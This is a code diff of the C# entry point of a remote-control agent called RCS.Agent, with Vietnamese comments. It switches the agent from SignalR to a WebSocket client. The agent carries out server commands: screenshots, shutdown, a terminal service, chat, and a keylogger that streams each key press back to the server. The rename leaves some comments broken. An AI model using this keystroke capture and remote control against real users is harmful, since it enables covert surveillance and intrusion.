@@ -3,8 +3,8 @@
 // Role: Điểm khởi chạy chính (Entry Point) của Agent.
 //
 // Nhiệm vụ:
-//      1. Khởi tạo và kết nối các dịch vụ (SignalR, System, App, Cam...).
-//      2. Lắng nghe lệnh từ Server thông qua SignalR.
+//      1. Khởi tạo và kết nối các dịch vụ (, System, App, Cam...).
+//      2. Lắng nghe lệnh từ Server thông qua .
 //      3. Điều phối luồng dữ liệu (UDP Stream cho Webcam, JSON cho lệnh).
 // -----------------------------------------------------------------------------
 
@@ -32,7 +32,7 @@ namespace RCS.Agent
         
         // Cấu hình Mặc định (Fallback)
         private const string DEFAULT_SERVER_HOST = "127.0.0.1";
-        private const int SERVER_TCP_PORT = 5000;  // Port SignalR
+        private const int SERVER_TCP_PORT = 5000;  // Port 
         private const int SERVER_UDP_PORT = 6000;  // Port Video
 
         // Cấu hình UDP Streaming
@@ -43,7 +43,7 @@ namespace RCS.Agent
         public const int SECOND_PER_FRAME = 1000 / FRAME_PER_SECOND; 
 
         // Biến lưu cấu hình động (Sẽ được gán khi chạy)
-        public static string SERVER_URL_FINAL;      // URL đầy đủ cho SignalR
+        public static string SERVER_URL_FINAL;      // URL đầy đủ cho 
         public static string CURRENT_SERVER_IP;     // IP trần cho UDP
 
         #endregion
@@ -51,7 +51,7 @@ namespace RCS.Agent
         #region --- SERVICES & STATE (DỊCH VỤ & BIẾN TRẠNG THÁI) ---
 
         // Các Service quản lý chức năng cụ thể
-        private static SignalRClient _signalRClient;
+        private static WebSocketClient _Client;
         private static ApplicationManager _appManager;
         private static ProcessMonitor _processMonitor;
         private static SystemControl _systemControl;
@@ -142,7 +142,8 @@ namespace RCS.Agent
 
             // 2. Kết nối tới Server
             Console.WriteLine("Connecting to Server...");
-            await _signalRClient.ConnectAsync(AGENT_ID);
+
+            await _Client.ConnectAsync(AGENT_ID);
 
             Console.WriteLine("Agent is running. Press CTRL+C to exit.");
 
@@ -163,12 +164,12 @@ namespace RCS.Agent
             _automationService = new AutomationService();
             // ...
 
-            // Khởi tạo SignalR và đăng ký sự kiện nhận lệnh
-            _signalRClient = new SignalRClient(SERVER_URL_FINAL);
+            // Khởi tạo  và đăng ký sự kiện nhận lệnh
+            _Client = new WebSocketClient(SERVER_URL_FINAL);
 
-            _terminalService = new TerminalService(_signalRClient); // Khởi tạo
+            _terminalService = new TerminalService(_Client); // Khởi tạo
 
-            _signalRClient.OnCommandReceived += HandleCommand;
+            _Client.OnCommandReceived += HandleCommand;
 
         }
 
@@ -177,7 +178,7 @@ namespace RCS.Agent
         #region --- COMMAND HANDLING (XỬ LÝ LỆNH TỪ SERVER) ---
 
         /// <summary>
-        /// Hàm trung tâm xử lý mọi lệnh nhận được từ SignalR.
+        /// Hàm trung tâm xử lý mọi lệnh nhận được từ .
         /// </summary>
         private static async Task HandleCommand(CommandMessage cmd)
         {
@@ -221,8 +222,8 @@ namespace RCS.Agent
 
                     // --- NHÓM 3: HỆ THỐNG (SYSTEM & SCREENSHOT) ---
                     case ProtocolConstants.ActionScreenshot:
-                        // Chụp màn hình và gửi trực tiếp dạng Base64 qua SignalR (không qua UDP)
-                        await _signalRClient.SendBinaryAsync(_mediaCapture.CaptureScreenBase64());
+                        // Chụp màn hình và gửi trực tiếp dạng Base64 qua  (không qua UDP)
+                        await _Client.SendBinaryAsync(_mediaCapture.CaptureScreenBase64());
                         break;
                     case ProtocolConstants.ActionShutdown:
                         _systemControl.Shutdown();
@@ -236,7 +237,7 @@ namespace RCS.Agent
                         // Start nhận callback mỗi khi phím được nhấn -> Gửi ngay về server
                         _keylogger.Start(async (key) => 
                         { 
-                            await _signalRClient.SendUpdateAsync(new RealtimeUpdate { Event = "key_pressed", Data = key }); 
+                            await _Client.SendUpdateAsync(new RealtimeUpdate { Event = "key_pressed", Data = key }); 
                         });
                         break;
                     case ProtocolConstants.ActionKeyloggerStop:
@@ -318,13 +319,13 @@ namespace RCS.Agent
                             {
                                 Console.WriteLine($"[Chat] User replied: {replyContent}");
                                 // Gửi tin nhắn trả lời về Server
-                                await _signalRClient.SendChatAsync(replyContent);
+                                await _Client.SendChatAsync(replyContent);
                             }
                             else
                             {
                                 Console.WriteLine("[Chat] User closed or empty reply.");
                                 // Tùy chọn: Gửi thông báo đã xem
-                                // await _signalRClient.SendChatAsync("[Đã xem]");
+                                // await _Client.SendChatAsync("[Đã xem]");
                             }
                         }
                         break;
@@ -434,11 +435,11 @@ namespace RCS.Agent
         #region --- HELPER METHODS ---
 
         /// <summary>
-        /// Gửi phản hồi nhanh về Server thông qua SignalR.
+        /// Gửi phản hồi nhanh về Server thông qua .
         /// </summary>
         private static async Task SendResponse(string action, object data)
         {
-            await _signalRClient.SendResponseAsync(new ResponseMessage 
+            await _Client.SendResponseAsync(new ResponseMessage 
             { 
                 Action = action, 
                 Response = data 
